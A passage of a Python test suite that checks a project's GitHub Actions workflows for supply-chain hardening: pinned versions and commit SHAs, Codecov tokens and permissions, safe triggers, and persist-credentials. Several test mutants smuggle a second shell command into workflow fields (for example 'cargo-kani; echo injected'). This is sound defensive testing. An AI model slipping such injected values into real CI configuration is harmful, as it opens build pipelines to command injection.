        removed = text.replace("          kani-version: 0.68.0\n", "", 1)
        self.assertNotEqual(removed, text)
        self.assertTrue(kani_version_violations(removed, path="kani.yml"))
        self.assertIn(KANI_VERSION_MSG, kani_version_violations(removed, path="kani.yml")[0])
        latest = text.replace("kani-version: 0.68.0", "kani-version: latest", 1)
        latest_violations = kani_version_violations(latest, path="kani.yml")
        self.assertEqual(len(latest_violations), 1)
        self.assertIn(KANI_VERSION_MSG, latest_violations[0])
        moved = text.replace("          kani-version: 0.68.0\n", "", 1)
        moved = moved.replace(
            "        uses: model-checking/kani-github-action@",
            "        env:\n          kani-version: 0.68.0\n        uses: model-checking/kani-github-action@",
            1,
        )
        self.assertNotEqual(moved, text)
        self.assertIn(KANI_VERSION_MSG, kani_version_violations(moved, path="kani.yml")[0])
        stable = third_party_action_pin_violations(
            "uses: dtolnay/rust-toolchain@stable\n",
            path="kani.yml",
        )
        self.assertTrue(stable)
        self.assertIn("dtolnay/rust-toolchain@stable", stable[0])
        quoted = third_party_action_pin_violations(
            'uses: "dtolnay/rust-toolchain@stable"\n',
            path="kani.yml",
        )
        self.assertTrue(quoted)
        self.assertIn("dtolnay/rust-toolchain@stable", quoted[0])
        self.assertNotIn('"', quoted[0])
        for path in github_action_surfaces():
            for line in _uses_scan_lines(path.read_text(encoding="utf-8")):
                if "@" not in line or not re.match(r"^\s*(?:-\s+)?uses:\s*\S", line):
                    continue
                ref = line.split("@", 1)[1].split("#", 1)[0].strip()
                self.assertNotEqual(ref, "stable", path)

    def test_llvm_cov_pin_mutants_are_rejected(self) -> None:
        editor = (WORKFLOWS / "aw-editor-tests.yml").read_text(encoding="utf-8")
        editor_ci = (WORKFLOWS / "editor-ci.yml").read_text(encoding="utf-8")
        self.assertEqual(llvm_cov_pin_violations(editor, path="aw-editor-tests.yml"), [])
        self.assertEqual(llvm_cov_pin_violations(editor_ci, path="editor-ci.yml"), [])
        unpinned = editor.replace(
            "cargo install cargo-llvm-cov --version 0.9.1 --locked",
            "cargo install cargo-llvm-cov",
            1,
        )
        self.assertNotEqual(unpinned, editor)
        cargo_line = next(
            number
            for number, line in enumerate(unpinned.splitlines(), start=1)
            if "cargo install cargo-llvm-cov" in line
        )
        self.assertEqual(
            llvm_cov_pin_violations(unpinned, path="aw-editor-tests.yml"),
            [f"aw-editor-tests.yml: {cargo_line}: {LLVM_COV_CARGO_MSG}"],
        )
        unlocked = editor.replace(" --locked", "", 1)
        self.assertTrue(llvm_cov_pin_violations(unlocked, path="aw-editor-tests.yml"))
        no_tool = re.sub(
            r"\n\s*with:\n\s*tool: cargo-llvm-cov@0\.9\.1\n",
            "\n",
            editor_ci,
            count=1,
        )
        self.assertNotEqual(no_tool, editor_ci)
        self.assertTrue(llvm_cov_pin_violations(no_tool, path="editor-ci.yml"))
        self.assertIn(
            LLVM_COV_ACTION_MSG,
            llvm_cov_pin_violations(no_tool, path="editor-ci.yml")[0],
        )
        floating = editor_ci.replace("tool: cargo-llvm-cov@0.9.1", "tool: cargo-llvm-cov", 1)
        self.assertIn(
            LLVM_COV_ACTION_MSG,
            llvm_cov_pin_violations(floating, path="editor-ci.yml")[0],
        )
        continued = editor.replace(
            "      run: cargo install cargo-llvm-cov --version 0.9.1 --locked\n",
            "      run: cargo install \\\n        cargo-llvm-cov\n",
            1,
        )
        self.assertNotEqual(continued, editor)
        self.assertIn(
            LLVM_COV_CARGO_MSG,
            llvm_cov_pin_violations(continued, path="aw-editor-tests.yml")[0],
        )
        chained = editor.replace(
            "cargo install cargo-llvm-cov --version 0.9.1 --locked",
            "cargo install cargo-llvm-cov --version 0.9.1 --locked && cargo install cargo-llvm-cov",
            1,
        )
        self.assertIn(
            LLVM_COV_CARGO_MSG,
            llvm_cov_pin_violations(chained, path="aw-editor-tests.yml")[0],
        )
        decoy = editor_ci.replace(
            "        with:\n          tool: cargo-llvm-cov@0.9.1\n",
            "        env:\n          tool: cargo-llvm-cov@0.9.1\n        with:\n          tool: cargo-llvm-cov\n",
            1,
        )
        self.assertNotEqual(decoy, editor_ci)
        self.assertIn(
            LLVM_COV_ACTION_MSG,
            llvm_cov_pin_violations(decoy, path="editor-ci.yml")[0],
        )

    def test_codecov_input_shape_mutants_are_rejected(self) -> None:
        text = (WORKFLOWS / "coverage.yml").read_text(encoding="utf-8")
        editor = (WORKFLOWS / "aw-editor-tests.yml").read_text(encoding="utf-8")
        self.assertEqual(codecov_with_key_violations(text, path="coverage.yml"), [])
        self.assertEqual(codecov_token_violations(text, path="coverage.yml"), [])
        self.assertEqual(codecov_trigger_violations(text, path="coverage.yml"), [])
        self.assertNotIn("actions: read", text)
        self.assertNotIn("actions: read", editor)
        for name, body in (
            ("coverage.yml", text),
            ("aw-editor-tests.yml", editor),
        ):
            self.assertIn(
                "actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2",
                body,
                name,
            )
            self.assertIn(
                "actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8.0.2",
                body,
                name,
            )
        yes = text.replace("fail_ci_if_error: true", "fail_ci_if_error: yes", 1)
        self.assertIn(CODECOV_FAIL_CI_MSG, codecov_fail_ci_violations(yes, path="coverage.yml")[0])
        turned_on = text.replace("use_oidc: true", "use_oidc: on", 1)
        self.assertIn(CODECOV_OIDC_MSG, codecov_oidc_violations(turned_on, path="coverage.yml")[0])
        quoted_true = text.replace("fail_ci_if_error: true", 'fail_ci_if_error: "true"', 1)
        self.assertEqual(codecov_fail_ci_violations(quoted_true, path="coverage.yml"), [])
        plain_true = text.replace("disable_search: true", "disable_search: True", 1)
        self.assertEqual(codecov_explicit_file_violations(plain_true, path="coverage.yml"), [])
        cased = text.replace(
            "codecov/codecov-action@",
            "Codecov/Codecov-Action@",
            1,
        )
        self.assertEqual(codecov_oidc_violations(cased, path="coverage.yml"), [])
        self.assertEqual(codecov_with_key_violations(cased, path="coverage.yml"), [])
        token_case = text.replace(
            "          use_oidc: true\n",
            "          use_oidc: true\n          Token: ${{ secrets['UPLOAD'] }}\n",
            1,
        )
        self.assertIn(CODECOV_TOKEN_MSG, codecov_token_violations(token_case, path="coverage.yml")[0])
        self.assertIn(CODECOV_WITH_MSG, codecov_with_key_violations(token_case, path="coverage.yml")[0])
        for extra in ("skip_validation: true", "binary: ./codecov", "url: https://example.invalid"):
            mutant = text.replace(
                "          use_oidc: true\n",
                f"          use_oidc: true\n          {extra}\n",
                1,
            )
            self.assertIn(
                CODECOV_WITH_MSG,
                codecov_with_key_violations(mutant, path="coverage.yml")[0],
                extra,
            )
        job_env = text.replace(
            "    timeout-minutes: 10\n",
            "    timeout-minutes: 10\n    env:\n      CODECOV_TOKEN: ${{ SECRETS.CODECOV_TOKEN }}\n",
            1,
        )
        self.assertIn(CODECOV_TOKEN_MSG, codecov_token_violations(job_env, path="coverage.yml")[0])
        workflow_env = text.replace(
            "permissions: {}\n",
            "permissions: {}\n\nenv:\n  token: literal\n",
            1,
        )
        self.assertIn(
            CODECOV_TOKEN_MSG,
            codecov_token_violations(workflow_env, path="coverage.yml")[0],
        )
        quoted_continue = text.replace(
            "    timeout-minutes: 45\n",
            '    timeout-minutes: 45\n    "continue-on-error": true\n',
            1,
        )
        self.assertIn(
            CODECOV_CONTINUE_MSG,
            codecov_continue_on_error_violations(quoted_continue, path="coverage.yml")[0],
        )
        flow_step = """
name: codecov
on: [push, schedule, workflow_dispatch]
permissions: {}
jobs:
  gen:
    name: gen
    permissions: {contents: read}
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - run: echo x
  codecov:
    name: up
    needs: gen
    permissions: {contents: read, id-token: write}
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - {name: up, uses: codecov/codecov-action@303a32d7a59b442fa8d48b6a1cc6825c09c847a5, continue-on-error: true, with: {files: a.xml, disable_search: true, fail_ci_if_error: true, use_oidc: true, version: v11.3.2, flags: f, name: n}}
"""
        self.assertIn(
            CODECOV_CONTINUE_MSG,
            codecov_continue_on_error_violations(flow_step, path="coverage.yml")[0],
        )
        flow_job = flow_step.replace(
            "  gen:\n    name: gen\n    permissions: {contents: read}\n    runs-on: ubuntu-latest\n    timeout-minutes: 5\n    steps:\n      - run: echo x\n",
            "  gen: {name: gen, permissions: {contents: read}, runs-on: ubuntu-latest, timeout-minutes: 5, continue-on-error: true, steps: [{run: echo x}]}\n",
            1,
        )
        self.assertNotEqual(flow_job, flow_step)
        self.assertIn(
            CODECOV_CONTINUE_MSG,
            codecov_continue_on_error_violations(flow_job, path="coverage.yml")[0],
        )
        for key in ("github-token", "run-id", "repository"):
            download = text.replace(
                "          path: tools/astraweave-assets/coverage\n",
                f"          path: tools/astraweave-assets/coverage\n          {key}: cross\n",
                1,
            )
            self.assertIn(
                DOWNLOAD_WITH_MSG,
                " ".join(coverage_permission_violations(download, path="coverage.yml")),
                key,
            )
        for key, inserted in (
            ("container", "    container: alpine\n"),
            ("services", "    services: {db: {image: redis}}\n"),
        ):
            widened = text.replace("    timeout-minutes: 10\n", f"    timeout-minutes: 10\n{inserted}", 1)
            messages = " ".join(coverage_permission_violations(widened, path="coverage.yml"))
            self.assertIn(UPLOAD_JOB_KEYS_MSG, messages, key)
            self.assertIn(CODECOV_UPLOAD_JOB_MSG, messages, key)
        reusable = text.replace(
            "  codecov:\n    name: Codecov upload\n",
            "  codecov:\n    name: Codecov upload\n    uses: ./.github/workflows/other.yml\n",
            1,
        )
        self.assertIn(
            UPLOAD_JOB_KEYS_MSG,
            " ".join(coverage_permission_violations(reusable, path="coverage.yml")),
        )
        checkout = text.replace(
            "      - name: Download coverage XML\n",
            "      - name: Checkout\n        uses: actions/checkout@v7\n      - name: Download coverage XML\n",
            1,
        )
        self.assertIn(
            CODECOV_UPLOAD_JOB_MSG,
            " ".join(coverage_permission_violations(checkout, path="coverage.yml")),
        )
        extra_read = text.replace(
            "      id-token: write\n",
            "      id-token: write\n      checks: read\n",
            1,
        )
        self.assertIn(
            CODECOV_PERMS_MSG,
            " ".join(coverage_permission_violations(extra_read, path="coverage.yml")),
        )
        actions_read = text.replace(
            "      id-token: write\n",
            "      id-token: write\n      actions: read\n",
            1,
        )
        self.assertIn(
            CODECOV_PERMS_MSG,
            " ".join(coverage_permission_violations(actions_read, path="coverage.yml")),
        )
        self.assertTrue(has_pull_request("on: [push, pull_request]\n"))
        self.assertTrue(has_pull_request("on: pull_request\n"))
        self.assertTrue(has_pull_request('"on":\n  pull_request:\n'))
        self.assertFalse(has_pull_request("on: [push, schedule, workflow_dispatch]\n"))
        self.assertEqual(
            codecov_trigger_violations(
                "name: n\non: [push, schedule, workflow_dispatch]\n",
                path="coverage.yml",
            ),
            [],
        )

        def swap_on(block: str) -> str:
            start = text.index("\non:\n")
            end = text.index("\nconcurrency:", start)
            return text[:start] + "\n" + block.rstrip("\n") + text[end:]

        for block in (
            "on: [push, pull_request]\n",
            "on:\n  pull_request_target:\n",
            "on:\n  workflow_run:\n    workflows: [CI]\n    types: [completed]\n",
            "on:\n  issue_comment:\n    types: [created]\n",
        ):
            mutant = swap_on(block)
            self.assertNotEqual(mutant, text)
            self.assertTrue(
                codecov_trigger_violations(mutant, path="coverage.yml"),
                block,
            )

    def test_codecov_download_step_keys_are_name_uses_and_with(self) -> None:
        text = (WORKFLOWS / "coverage.yml").read_text(encoding="utf-8")
        self.assertNotIn(DOWNLOAD_STEP_MSG, " ".join(coverage_permission_violations(text, path="coverage.yml")))
        anchor = (
            "      - name: Download coverage XML\n"
            "        uses: actions/download-artifact@"
        )
        for extra in (
            "        env:\n          EXTRA: \"1\"\n",
            "        id: xml\n",
            '        "env": {EXTRA: "1"}\n',
        ):
            mutant = text.replace(anchor, "      - name: Download coverage XML\n" + extra + "        uses: actions/download-artifact@", 1)
            self.assertNotEqual(mutant, text, extra)
            messages = " ".join(coverage_permission_violations(mutant, path="coverage.yml"))
            self.assertIn(DOWNLOAD_STEP_MSG, messages, extra)

    def test_codecov_download_with_and_name_are_exact(self) -> None:
        """with: is exactly {name, path}, and name is the pinned artifact.

        A missing name is still a subset of {name, path}. A rename to
        coverage-report keeps both keys. Both pass a subset check.
        """
        text = (WORKFLOWS / "coverage.yml").read_text(encoding="utf-8")
        editor = (WORKFLOWS / "aw-editor-tests.yml").read_text(encoding="utf-8")
        self.assertEqual(coverage_permission_violations(text, path="coverage.yml"), [])
        self.assertNotIn(
            DOWNLOAD_NAME_MSG,
            " ".join(coverage_permission_violations(editor, path="aw-editor-tests.yml")),
        )
        download = (
            "          name: coverage-xml\n"
            "          path: tools/astraweave-assets/coverage\n"
        )
        self.assertEqual(text.count(download), 2)
        missing_name = text.replace(
            download,
            "          path: tools/astraweave-assets/coverage\n",
            1,
        )
        self.assertNotEqual(missing_name, text)
        missing_doc, missing_err = load_workflow_yaml(missing_name)
        self.assertIsNone(missing_err)
        codecov_job = missing_doc["jobs"]["codecov"]
        self.assertFalse(_is_upload_only(codecov_job))
        missing_messages = " ".join(
            coverage_permission_violations(missing_name, path="coverage.yml")
        )
        self.assertIn(DOWNLOAD_WITH_MSG, missing_messages)
        renamed = text.replace(download, download.replace("coverage-xml", "coverage-report"), 1)
        self.assertNotEqual(renamed, text)
        renamed_doc, renamed_err = load_workflow_yaml(renamed)
        self.assertIsNone(renamed_err)
        self.assertTrue(_is_upload_only(renamed_doc["jobs"]["codecov"]))
        renamed_messages = " ".join(
            coverage_permission_violations(renamed, path="coverage.yml")
        )
        self.assertIn(DOWNLOAD_NAME_MSG, renamed_messages)
        self.assertNotIn(DOWNLOAD_WITH_MSG, renamed_messages)
        cased = text.replace(download, download.replace("coverage-xml", "Coverage-XML"), 1)
        self.assertIn(
            DOWNLOAD_NAME_MSG,
            " ".join(coverage_permission_violations(cased, path="coverage.yml")),
        )
        editor_download = "        name: aw-editor-lcov\n        path: .\n"
        editor_renamed = editor.replace(
            editor_download,
            editor_download.replace("aw-editor-lcov", "coverage-xml"),
            1,
        )
        self.assertNotEqual(editor_renamed, editor)
        self.assertIn(
            DOWNLOAD_NAME_MSG,
            " ".join(coverage_permission_violations(editor_renamed, path="aw-editor-tests.yml")),
        )

    def test_codecov_upload_needs_and_job_end_are_pinned(self) -> None:
        """needs is exactly coverage, and that job ends at upload-artifact."""
        text = (WORKFLOWS / "coverage.yml").read_text(encoding="utf-8")
        editor = (WORKFLOWS / "aw-editor-tests.yml").read_text(encoding="utf-8")
        for path, body in (("coverage.yml", text), ("aw-editor-tests.yml", editor)):
            self.assertNotIn(UPLOAD_NEEDS_MSG, " ".join(coverage_permission_violations(body, path=path)))
            self.assertNotIn(
                COVERAGE_JOB_END_MSG,
                " ".join(coverage_permission_violations(body, path=path)),
            )
            listed = body.replace(
                "    name: Codecov upload\n    needs: coverage\n",
                "    name: Codecov upload\n    needs: [coverage]\n",
                1,
            )
            self.assertNotEqual(listed, body, path)
            self.assertNotIn(
                UPLOAD_NEEDS_MSG,
                " ".join(coverage_permission_violations(listed, path=path)),
                path,
            )
            widened = body.replace(
                "    name: Codecov upload\n    needs: coverage\n",
                "    name: Codecov upload\n    needs: [coverage, coverage-html]\n",
                1,
            )
            self.assertNotEqual(widened, body, path)
            self.assertIn(
                UPLOAD_NEEDS_MSG,
                " ".join(coverage_permission_violations(widened, path=path)),
                path,
            )
            other = body.replace(
                "    name: Codecov upload\n    needs: coverage\n",
                "    name: Codecov upload\n    needs: coverage-html\n",
                1,
            )
            self.assertIn(
                UPLOAD_NEEDS_MSG,
                " ".join(coverage_permission_violations(other, path=path)),
                path,
            )
        html_back = text.replace(
            "          retention-days: 30\n\n  codecov:\n    name: Codecov upload\n",
            "          retention-days: 30\n\n"
            "      - name: Generate HTML report\n"
            "        run: exit 1\n\n"
            "  codecov:\n    name: Codecov upload\n",
            1,
        )
        self.assertNotEqual(html_back, text)
        self.assertIn(
            COVERAGE_JOB_END_MSG,
            " ".join(coverage_permission_violations(html_back, path="coverage.yml")),
        )
        editor_tail = editor.replace(
            "        retention-days: 30\n\n  codecov:\n    name: Codecov upload\n",
            "        retention-days: 30\n\n"
            "    - name: After lcov\n"
            "      run: exit 1\n\n"
            "  codecov:\n    name: Codecov upload\n",
            1,
        )
        self.assertNotEqual(editor_tail, editor)
        self.assertIn(
            COVERAGE_JOB_END_MSG,
            " ".join(coverage_permission_violations(editor_tail, path="aw-editor-tests.yml")),
        )

    def test_coverage_job_end_is_the_pinned_upload(self) -> None:
        """The last step's artifact name is pinned, and the step list is ordered.

        A trailing upload-artifact with another name still ends on
        upload-artifact. Renaming the report, a job-level if:, if: on the
        upload, an HTML tarpaulin command in the XML script, and a step
        between llvm-cov and the lcov upload each fail this check.
        """
        text = (WORKFLOWS / "coverage.yml").read_text(encoding="utf-8")
        editor = (WORKFLOWS / "aw-editor-tests.yml").read_text(encoding="utf-8")
        renamed = text.replace(
            "          name: coverage-xml\n"
            "          path: tools/astraweave-assets/coverage/cobertura.xml\n",
            "          name: decoy\n"
            "          path: tools/astraweave-assets/coverage/cobertura.xml\n",
            1,
        )
        self.assertNotEqual(renamed, text)
        renamed_doc, renamed_err = load_workflow_yaml(renamed)
        self.assertIsNone(renamed_err)
        last = renamed_doc["jobs"]["coverage"]["steps"][-1]
        self.assertTrue(_is_named_action(last, "actions/upload-artifact"))
        self.assertEqual(_ci_item(last.get("with"), "name")[1], "decoy")
        self.assertIn(
            COVERAGE_JOB_END_MSG,
            " ".join(coverage_permission_violations(renamed, path="coverage.yml")),
        )
        decoy_tail = text.replace(
            "          name: coverage-xml\n"
            "          path: tools/astraweave-assets/coverage/cobertura.xml\n"
            "          retention-days: 30\n",
            "          name: coverage-xml\n"
            "          path: tools/astraweave-assets/coverage/cobertura.xml\n"
            "          retention-days: 30\n"
            "      - name: After XML\n"
            "        if: always()\n"
            "        run: exit 1\n"
            "      - name: Decoy upload\n"
            "        uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2\n"
            "        with:\n"
            "          name: decoy\n"
            "          path: .\n",
            1,
        )
        self.assertNotEqual(decoy_tail, text)
        decoy_doc, decoy_err = load_workflow_yaml(decoy_tail)
        self.assertIsNone(decoy_err)
        decoy_last = decoy_doc["jobs"]["coverage"]["steps"][-1]
        self.assertTrue(_is_named_action(decoy_last, "actions/upload-artifact"))
        self.assertIn(
            COVERAGE_JOB_END_MSG,
            " ".join(coverage_permission_violations(decoy_tail, path="coverage.yml")),
        )
        job_if = text.replace(
            "  coverage:\n    name: Generate Code Coverage\n",
            "  coverage:\n    name: Generate Code Coverage\n    if: false\n",
            1,
        )
        self.assertNotEqual(job_if, text)
        self.assertIn(
            COVERAGE_JOB_END_MSG,
            " ".join(coverage_permission_violations(job_if, path="coverage.yml")),
        )
        step_if = text.replace(
            "      - name: Upload coverage XML\n        uses: actions/upload-artifact@",
            "      - name: Upload coverage XML\n        if: always()\n"
            "        uses: actions/upload-artifact@",
            1,
        )
        self.assertNotEqual(step_if, text)
        self.assertIn(
            COVERAGE_JOB_END_MSG,
            " ".join(coverage_permission_violations(step_if, path="coverage.yml")),
        )
        html_in_script = text.replace(
            "          cargo tarpaulin --out Xml --output-dir coverage "
            "--exclude-files 'src/main.rs' --exclude-files 'tests/*'\n",
            "          cargo tarpaulin --out Xml --output-dir coverage "
            "--exclude-files 'src/main.rs' --exclude-files 'tests/*'\n"
            "          cargo tarpaulin --out Html --output-dir coverage-html\n",
            1,
        )
        self.assertNotEqual(html_in_script, text)
        self.assertIn(
            COVERAGE_JOB_END_MSG,
            " ".join(coverage_permission_violations(html_in_script, path="coverage.yml")),
        )
        between = editor.replace(
            "        cargo llvm-cov --package aw_editor --lib --lcov --output-path lcov.info\n\n"
            "    - name: Upload coverage report\n",
            "        cargo llvm-cov --package aw_editor --lib --lcov --output-path lcov.info\n\n"
            "    - name: Between test and upload\n"
            "      run: exit 1\n\n"
            "    - name: Upload coverage report\n",
            1,
        )
        self.assertNotEqual(between, editor)
        between_doc, between_err = load_workflow_yaml(between)
        self.assertIsNone(between_err)
        editor_steps = between_doc["jobs"]["coverage"]["steps"]
        self.assertEqual(
            _ci_item(editor_steps[-1].get("with"), "name")[1],
            "aw-editor-lcov",
        )
        self.assertIn(
            COVERAGE_JOB_END_MSG,
            " ".join(coverage_permission_violations(between, path="aw-editor-tests.yml")),
        )

    def test_coverage_tarpaulin_script_is_the_approved_command(self) -> None:
        """The generate script is the approved XML command and nothing else.

        A check that only rejects the literal Html still accepts --out html,
        --out HTML, --out Lcov, and a second non-tarpaulin command.
        """
        text = (WORKFLOWS / "coverage.yml").read_text(encoding="utf-8")
        self.assertNotIn(
            COVERAGE_JOB_END_MSG,
            " ".join(coverage_permission_violations(text, path="coverage.yml")),
        )
        base = (
            "          cargo tarpaulin --out Xml --output-dir coverage "
            "--exclude-files 'src/main.rs' --exclude-files 'tests/*'\n"
        )
        self.assertEqual(text.count(base), 1)
        extras = {
            "html": "          cargo tarpaulin --out html --output-dir coverage-html\n",
            "HTML": "          cargo tarpaulin --out HTML --output-dir coverage-html\n",
            "Html": "          cargo tarpaulin --out Html --output-dir coverage-html\n",
            "Lcov": "          cargo tarpaulin --out Lcov --output-dir coverage-lcov\n",
            "lcov": "          cargo tarpaulin --out lcov --output-dir coverage-lcov\n",
            "other": "          echo injected\n",
        }
        for name, extra in extras.items():
            mutant = text.replace(base, base + extra, 1)
            self.assertNotEqual(mutant, text, name)
            doc, err = load_workflow_yaml(mutant)
            self.assertIsNone(err, name)
            run = next(
                _run_text(step)
                for step in doc["jobs"]["coverage"]["steps"]
                if "cargo tarpaulin" in _run_text(step)
            )
            self.assertNotEqual(run, _APPROVED_XML_TARPAULIN_RUN, name)
            self.assertIn(
                COVERAGE_JOB_END_MSG,
                " ".join(coverage_permission_violations(mutant, path="coverage.yml")),
                name,
            )

    def test_coverage_producer_job_keys_reject_needs(self) -> None:
        """The coverage job's keys exclude needs in both workflows.

        needs: pre is the relay producer. A key compare that drops needs,
        or a check that only rejects if:, accepts that job. env,
        continue-on-error, and container are outside the same allowlist.
        The report upload stays the last step, so the failure is the key.
        """
        workflows = {
            "coverage.yml": "  coverage:\n    name: Generate Code Coverage\n",
            "aw-editor-tests.yml": "  coverage:\n    name: Test Coverage\n",
        }
        extras = {
            "needs": "    needs: pre\n",
            "env": '    env:\n      EXTRA: "1"\n',
            "continue-on-error": "    continue-on-error: true\n",
            "container": '    container: "ubuntu:24.04"\n',
        }
        for path, anchor in workflows.items():
            text = (WORKFLOWS / path).read_text(encoding="utf-8")
            self.assertEqual(text.count(anchor), 1, path)
            self.assertNotIn(
                COVERAGE_JOB_END_MSG,
                " ".join(coverage_permission_violations(text, path=path)),
                path,
            )
            for name, extra in extras.items():
                mutant = text.replace(
                    anchor,
                    "  coverage:\n" + extra + anchor[len("  coverage:\n") :],
                    1,
                )
                self.assertNotEqual(mutant, text, f"{path}:{name}")
                doc, err = load_workflow_yaml(mutant)
                self.assertIsNone(err, f"{path}:{name}")
                job = doc["jobs"]["coverage"]
                self.assertIn(name, job, f"{path}:{name}")
                last = job["steps"][-1]
                self.assertTrue(
                    _is_named_action(last, "actions/upload-artifact"),
                    f"{path}:{name}",
                )
                self.assertIn(
                    COVERAGE_JOB_END_MSG,
                    " ".join(coverage_permission_violations(mutant, path=path)),
                    f"{path}:{name}",
                )

    def test_kani_with_inputs_are_allowlisted(self) -> None:
        """command, working-directory, and repeated with: keys are checked.

        `_ci_item` returns the first case-variant. A later Args key, and an
        exact duplicate of the approved args line, still fail.
        """
        text = (WORKFLOWS / "kani.yml").read_text(encoding="utf-8")
        self.assertEqual(kani_dispatch_args_violations(text, path="kani.yml"), [])
        anchor = (
            "          command: cargo-kani\n"
            "          working-directory: .\n"
            "          args: --package astraweave-math -Z unstable-options "
            "--harness-timeout ${{ steps.timeout.outputs.value }}\n"
        )
        self.assertEqual(text.count(anchor), 1)
        approved = _approved_kani_args("kani-math")
        shapes = {
            "command-inject": (
                anchor.replace("command: cargo-kani", "command: cargo-kani; echo injected", 1),
                KANI_COMMAND_MSG,
            ),
            "command-inputs": (
                anchor.replace(
                    "command: cargo-kani",
                    "command: cargo-kani ${{ inputs.crates }}",
                    1,
                ),
                KANI_COMMAND_MSG,
            ),
            "command-absent": (
                anchor.replace("          command: cargo-kani\n", "", 1),
                KANI_COMMAND_MSG,
            ),
            "workdir-inject": (
                anchor.replace("working-directory: .", "working-directory: .; echo injected", 1),
                KANI_WORKDIR_MSG,
            ),
            "workdir-expr": (
                anchor.replace(
                    "working-directory: .",
                    "working-directory: ${{ inputs.crates }}",
                    1,
                ),
                KANI_WORKDIR_MSG,
            ),
            "workdir-absent": (
                anchor.replace("          working-directory: .\n", "", 1),
                KANI_WORKDIR_MSG,
            ),
            "extra-key": (
                anchor.replace(
                    "          working-directory: .\n",
                    "          sudo: true\n          working-directory: .\n",
                    1,
                ),
                KANI_WITH_MSG,
            ),
        }
        for name, (snippet, message) in shapes.items():
            mutant = text.replace(anchor, snippet, 1)
            self.assertNotEqual(mutant, text, name)
            violations = kani_dispatch_args_violations(mutant, path="kani.yml")
            self.assertTrue(violations, name)
            self.assertIn(message, " ".join(violations), name)
        case_variant = text.replace(
            anchor,
            anchor + "          Args: --package astraweave-math ${{ inputs.crates }}\n",
            1,
        )
        self.assertNotEqual(case_variant, text)
        case_doc, case_err = load_workflow_yaml(case_variant)
        self.assertIsNone(case_err)
        case_step = next(
            step
            for job_id, _job, step in _iter_steps(case_doc)
            if job_id == "kani-math" and _is_named_action(step, "model-checking/kani-github-action")
        )
        self.assertEqual(_ci_item(case_step.get("with"), "args")[1], approved)
        case_violations = kani_dispatch_args_violations(case_variant, path="kani.yml")
        self.assertIn(KANI_DUP_MSG, " ".join(case_violations))
        self.assertNotIn(KANI_ARGS_MSG, " ".join(case_violations))
        duplicated = text.replace(
            anchor,
            "          working-directory: .\n"
            "          args: --package astraweave-math -Z unstable-options "
            "--harness-timeout ${{ steps.timeout.outputs.value }}\n"
            "          args: --package astraweave-math -Z unstable-options "
            "--harness-timeout ${{ steps.timeout.outputs.value }}\n",
            1,
        )
        self.assertNotEqual(duplicated, text)
        dup_doc, dup_err = load_workflow_yaml(duplicated)
        self.assertIsNone(dup_err)
        dup_step = next(
            step
            for job_id, _job, step in _iter_steps(dup_doc)
            if job_id == "kani-math" and _is_named_action(step, "model-checking/kani-github-action")
        )
        self.assertEqual(_ci_item(dup_step.get("with"), "args")[1], approved)
        self.assertTrue(getattr(dup_step.get("with"), "duplicate_keys", None))
        dup_violations = kani_dispatch_args_violations(duplicated, path="kani.yml")
        self.assertIn(KANI_DUP_MSG, " ".join(dup_violations))
        self.assertNotIn(KANI_ARGS_MSG, " ".join(dup_violations))

    def test_checkout_persist_credentials_is_false(self) -> None:
        text = (WORKFLOWS / "coverage.yml").read_text(encoding="utf-8")
        editor = (WORKFLOWS / "aw-editor-tests.yml").read_text(encoding="utf-8")
        self.assertEqual(checkout_persist_credentials_violations(text, path="coverage.yml"), [])
        self.assertEqual(
            checkout_persist_credentials_violations(editor, path="aw-editor-tests.yml"),
            [],
        )
        self.assertEqual(text.count("persist-credentials: false"), 2)
        self.assertEqual(editor.count("persist-credentials: false"), 2)
        dropped = text.replace(
            "        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n"
            "        with:\n"
            "          persist-credentials: false\n",
            "        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n",
            1,
        )
        self.assertNotEqual(dropped, text)
        dropped_violations = checkout_persist_credentials_violations(dropped, path="coverage.yml")
        self.assertTrue(dropped_violations)
        self.assertIn(CHECKOUT_PERSIST_MSG, dropped_violations[0])
        enabled = editor.replace("persist-credentials: false", "persist-credentials: true", 1)
        enabled_violations = checkout_persist_credentials_violations(
            enabled, path="aw-editor-tests.yml"
        )
        self.assertTrue(enabled_violations)
        self.assertIn(CHECKOUT_PERSIST_MSG, enabled_violations[0])

    def test_kani_persist_credentials_removal_is_rejected(self) -> None:
        """Removing persist-credentials from a kani.yml checkout fails the check.

        editor-ci.yml stays outside this check.
        """
        text = (WORKFLOWS / "kani.yml").read_text(encoding="utf-8")
        editor_ci = (WORKFLOWS / "editor-ci.yml").read_text(encoding="utf-8")
        self.assertEqual(checkout_persist_credentials_violations(text, path="kani.yml"), [])
        self.assertEqual(
            checkout_persist_credentials_violations(editor_ci, path="editor-ci.yml"),
            [],
        )
        anchor = (
            "      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n"
            "        with:\n"
            "          persist-credentials: false\n"
        )
        self.assertEqual(text.count(anchor), 4)
        self.assertEqual(text.count("persist-credentials: false"), 4)
        bare = (
            "      - uses: actions/checkout@"
            "3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n"
        )
        dropped = text.replace(anchor, bare, 1)
        self.assertNotEqual(dropped, text)
        self.assertEqual(dropped.count("persist-credentials: false"), 3)
        violations = checkout_persist_credentials_violations(dropped, path="kani.yml")
        self.assertTrue(violations)
        self.assertIn(CHECKOUT_PERSIST_MSG, violations[0])

    def test_kani_checkout_and_upload_are_sha_pinned(self) -> None:
        """kani.yml checkout and upload-artifact are commit SHAs. editor-ci.yml is not."""
        text = (WORKFLOWS / "kani.yml").read_text(encoding="utf-8")
        editor_ci = (WORKFLOWS / "editor-ci.yml").read_text(encoding="utf-8")
        self.assertEqual(kani_action_sha_violations(text, path="kani.yml"), [])
        self.assertEqual(kani_action_sha_violations(editor_ci, path="editor-ci.yml"), [])
        self.assertEqual(
            text.count("actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7"),
            4,
        )
        self.assertEqual(
            text.count(
                "actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2"
            ),
